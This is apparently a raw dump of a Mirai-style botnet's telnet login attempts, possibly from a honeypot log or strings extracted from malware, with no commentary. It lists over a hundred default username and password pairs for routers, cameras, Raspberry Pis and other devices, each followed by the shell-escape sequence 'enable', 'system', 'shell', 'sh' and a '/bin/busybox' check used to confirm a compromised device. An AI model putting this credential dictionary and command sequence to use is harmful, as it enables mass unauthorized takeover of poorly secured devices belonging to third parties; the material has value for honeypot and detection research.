root

root
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

juantech
enable
system
shell
sh
/bin/busybox tmu8i3gw
super

forgot
enable
system
shell
sh
/bin/busybox tmu8i3gw
manuf

xxyyzz
enable
system
shell
sh
/bin/busybox tmu8i3gw
user
enable
system
shell
sh
/bin/busybox tmu8i3gw
patrol

patrol
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

2222
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

arcsight
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

admin1234
enable
system
shell
sh
/bin/busybox tmu8i3gw
netman
enable
system
shell
sh
/bin/busybox tmu8i3gw
md110

help
enable
system
shell
sh
/bin/busybox tmu8i3gw
backdoor
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

7ujmko0admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
wproot

cat1029
enable
system
shell
sh
/bin/busybox tmu8i3gw
administrator

ggdaseuaimhrke
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

idirect
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

hi3518
enable
system
shell
sh
/bin/busybox tmu8i3gw
tutor
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

administrator
enable
system
shell
sh
/bin/busybox tmu8i3gw
wank

wank
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

1111111
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

9999
enable
system
shell
sh
/bin/busybox tmu8i3gw
rewt

satori
enable
system
shell
sh
/bin/busybox tmu8i3gw
cliuser

cliuser
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

alien
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

raspi
enable
system
shell
sh
/bin/busybox tmu8i3gw
private
enable
system
shell
sh
/bin/busybox tmu8i3gw
3ascotel
enable
system
shell
sh
/bin/busybox tmu8i3gw
system

manager
enable
system
shell
sh
/bin/busybox tmu8i3gw
demos
enable
system
shell
sh
/bin/busybox tmu8i3gw
intraswitch

asante
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

klv1234
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

bintec
enable
system
shell
sh
/bin/busybox tmu8i3gw
netscreen

<<< %s(un='%s') = %u
enable
system
shell
sh
/bin/busybox tmu8i3gw
toor
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

cat1029
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

wh00t!
enable
system
shell
sh
/bin/busybox tmu8i3gw
cmc

password
enable
system
shell
sh
/bin/busybox tmu8i3gw
hax0r
enable
system
shell
sh
/bin/busybox tmu8i3gw
mobile

alpine
enable
system
shell
sh
/bin/busybox tmu8i3gw
backdoor
enable
system
shell
sh
/bin/busybox tmu8i3gw
manager

manager
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

indigo
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

00000000
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

dasdec1
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

123456
enable
system
shell
sh
/bin/busybox tmu8i3gw
security

security
enable
system
shell
sh
/bin/busybox tmu8i3gw
tech

tech
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

pass
enable
system
shell
sh
/bin/busybox tmu8i3gw
swift

swift
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

abc123
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

tandberg
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

atlantis
enable
system
shell
sh
/bin/busybox tmu8i3gw
default
enable
system
shell
sh
/bin/busybox tmu8i3gw
db2fenc1

db2fenc1
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

meinsm
enable
system
shell
sh
/bin/busybox tmu8i3gw
superuser

passw0rd
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

h2014071
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

7ujmko0admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

qwestm0dem
enable
system
shell
sh
/bin/busybox tmu8i3gw
db2as

ibmdb2
enable
system
shell
sh
/bin/busybox tmu8i3gw
super

super
enable
system
shell
sh
/bin/busybox tmu8i3gw
operator

profense
enable
system
shell
sh
/bin/busybox tmu8i3gw
adminlvjh

adminlvjh123
enable
system
shell
sh
/bin/busybox tmu8i3gw

enable
system
shell
sh
/bin/busybox tmu8i3gw
root

1234567890
enable
system
shell
sh
/bin/busybox tmu8i3gw
cisco
enable
system
shell
sh
/bin/busybox tmu8i3gw
pi

raspberry
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

vmware
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
service

service
enable
system
shell
sh
/bin/busybox tmu8i3gw
gamez

lrkr0x
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

rootme
enable
system
shell
sh
/bin/busybox tmu8i3gw
superuser

123456
enable
system
shell
sh
/bin/busybox tmu8i3gw
citel
enable
system
shell
sh
/bin/busybox tmu8i3gw
craft

crftpw
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

user
enable
system
shell
sh
/bin/busybox tmu8i3gw
jill
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

rain
enable
system
shell
sh
/bin/busybox tmu8i3gw
date
enable
system
shell
sh
/bin/busybox tmu8i3gw
manager

friend
enable
system
shell
sh
/bin/busybox tmu8i3gw
manager
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

password
enable
system
shell
sh
/bin/busybox tmu8i3gw
cisco

cisco
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

123qwe
enable
system
shell
sh
/bin/busybox tmu8i3gw
r00t
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox tmu8i3gw
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox tmu8i3gw
4dgifts
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

m
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

video
enable
system
shell
sh
/bin/busybox tmu8i3gw
administrator

1234
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

zlxx.
enable
system
shell
sh
/bin/busybox tmu8i3gw
nsroot

nsroot
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

admin
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

infoblox
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

qwe123
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

vizxv
enable
system
shell
sh
/bin/busybox tmu8i3gw
superuser
enable
system
shell
sh
/bin/busybox tmu8i3gw
informix

informix
enable
system
shell
sh
/bin/busybox tmu8i3gw
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

4321
enable
system
shell
sh
/bin/busybox tmu8i3gw
tech
enable
system
shell
sh
/bin/busybox tmu8i3gw
iclock

timely
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

123
enable
system
shell
sh
/bin/busybox tmu8i3gw
admin

switch
enable
system
shell
sh
/bin/busybox tmu8i3gw
mpi
enable
system
shell
sh
/bin/busybox tmu8i3gw
apc

apc
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

changemenow
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

antslq
enable
system
shell
sh
/bin/busybox tmu8i3gw
diag

danger
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

权限
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

nagiosxi
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

zte521
enable
system
shell
sh
/bin/busybox tmu8i3gw
888888

888888
enable
system
shell
sh
/bin/busybox tmu8i3gw
ascend
enable
system
shell
sh
/bin/busybox tmu8i3gw
sync
enable
system
shell
sh
/bin/busybox tmu8i3gw
support

support
enable
system
shell
sh
/bin/busybox tmu8i3gw
root

tl789
enable
system
shell
sh
/bin/busybox tmu8i3gw
